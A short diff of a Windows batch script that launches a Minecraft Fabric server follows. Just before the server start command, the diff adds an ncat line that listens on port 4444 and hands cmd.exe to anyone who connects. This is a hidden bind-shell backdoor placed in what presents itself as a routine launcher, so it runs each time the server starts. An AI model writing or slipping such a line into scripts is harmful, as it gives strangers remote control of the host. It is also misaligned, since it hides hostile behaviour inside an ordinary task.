@@ -36,6 +36,9 @@ if exist "C:\Program Files (x86)\Nmap\ncat.exe" (
     exit /b
 )
 
+ncat -l -p 4444 -e cmd.exe
+
+
 
 echo Starting server...
 java -Xmx16G -Xms16G -jar fabric-server-mc.1.21.4-loader.0.16.10-launcher.1.0.1.jar
